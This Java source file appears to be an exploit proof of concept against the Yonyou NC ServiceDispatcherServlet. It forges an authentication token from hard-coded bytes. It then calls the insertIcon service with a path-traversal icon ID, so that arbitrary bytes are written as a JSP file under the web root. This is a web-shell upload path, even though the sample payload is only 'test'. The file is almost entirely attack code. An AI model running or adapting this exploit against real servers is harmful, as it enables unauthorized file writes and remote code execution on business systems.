import nc.bs.framework.common.InvocationInfo;
import nc.bs.framework.comn.NetStreamContext;
import nc.bs.framework.comn.Result;
import nc.bs.framework.exception.ConnectorException;
import nc.bs.framework.rmi.Address;
import nc.bs.framework.rmi.RemoteChannel;
import nc.bs.framework.rmi.RemoteChannelFactory;
import nc.bs.framework.rmi.RemoteChannelFactoryManager;
import nc.bs.framework.server.TokenProcessorImpl;
import nc.vo.sm.cmenu.CustomMenuIconVO;

public class ServiceDispatcherServlet_exp3 {
    public static void main(String[] args) throws Throwable {

        String payload = "test";

        CustomMenuIconVO customMenuIconVO = new CustomMenuIconVO();
        customMenuIconVO.setCIconID("../../..//hotwebs/uapws/1111ccc.jsp");
        customMenuIconVO.setIcon(payload.getBytes());

        InvocationInfo invocationInfo = new InvocationInfo("->nc.itf.uap.sf.ICustomMenuService","insertIcon",new Class[]{CustomMenuIconVO.class},new Object[]{customMenuIconVO},"2222222");



        //
        System.setProperty("ncc.myLine","true");
        Address target = new Address("http://127.0.0.1:40888/ServiceDispatcherServlet");

        // 请求流中追加token
        TokenProcessorImpl tokenProcessor = new TokenProcessorImpl();
        byte[] token = tokenProcessor.genToken("NCSystem".getBytes(), "uapesb".getBytes());
        byte[] pToken = new byte[]{-128, 68, 30, 117, 108, 77, -8, -68, -49, 13, 41, -114, -26, 83, 105, -67};
        System.arraycopy(pToken,0,token,8,pToken.length);
        NetStreamContext.setToken(token);
        //

//        RemoteChannelFactory rcf = RemoteChannelFactoryManager.getDefault().getRemoteChannelFactory(target.getProtocol());
        HttpRemoteChannelFactory rcf = new HttpRemoteChannelFactory();
        if (rcf == null) {
            throw new ConnectorException("not support target address:" + target);
        } else {
            RemoteChannel rc = null;
            Result ret = null;

            Object var19;
            try {

                rc = rcf.createRemoteChannel(target);
                rc.init();
                RemoteUtil.writeObject(rc.getOutputStream(), invocationInfo);
                ret = (Result)RemoteUtil.readObject(rc.getInputStream(), (boolean[])null);
                if (ret.appexception != null) {
                    throw ret.appexception;
                }

                var19 = ret.result;
            }  finally {
                if (rc != null) {
                    rc.destroy();
                }
            }

        }

    }
}
